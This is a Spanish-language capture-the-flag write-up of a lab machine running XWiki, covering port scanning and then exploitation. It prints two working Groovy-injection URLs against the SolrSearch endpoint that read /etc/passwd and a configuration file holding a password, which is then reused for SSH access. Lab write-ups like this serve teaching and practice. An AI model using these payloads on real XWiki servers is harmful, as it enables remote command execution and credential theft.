
tags: #maquina #writeups 

---
Comenzamos la maquina realizando un ping para comprobar que esta activa
![[Pasted image 20251114183237.png]]
Como se puede ver la maquina esta activa y responde a la traza ICMP.

Continuamos realizando un escaneo con la herramienta nmap para ver que puertos tiene abiertos.
Encontramos 3 puertos abiertos 22, 80 y 8080
![[Pasted image 20251114183512.png]]

Realizamos un escaneo de versión y lanzamos el conjunto de scripts básico de reconocimiento.
![[Pasted image 20251114183659.png]]
El escaneo nos muestra dos dominios que agregaremos al /etc/hosts
![[Pasted image 20251114184135.png]]

Explorando las webs encontramos que la segunda (la wiki) filtra la versión de la wiki en el footer 
![[Pasted image 20251114185527.png]]
Se trata de XWiki Debian 15.10.8.
Explorando la web encontramos un exploit que supuestamente es valido para la versión 15.10.10
![[Pasted image 20251114185640.png]]

Leyendo un poco sobre el exploit recomienda probar un payload con el cual podremos ver si tenemos ejecución remota de comandos y de hacerlo seria vulnerable a ese tipo de ataque.
```url
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
```
Al ejecutarlo nos descarga el archivo passwd con lo que el payload habría tenido éxito.
![[Pasted image 20251114185913.png]]

Haciendo uso del comando 
```url
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
```

conseguimos descargar el archivo de configuracion de xwiki hibernate qeu contiene la contraseña para un usuario theEd1t0rTeam99 y dado que el unico usuario en la carpeta home es oliver procedemos a intentar una conexion ssh

![[Pasted image 20251115002159.png]]

en la ruta home del usuario encontramos la flag de usuario

![[Pasted image 20251115002353.png]]

ya que tenemos usuario solo queda realizar una escalada de privilegios a root
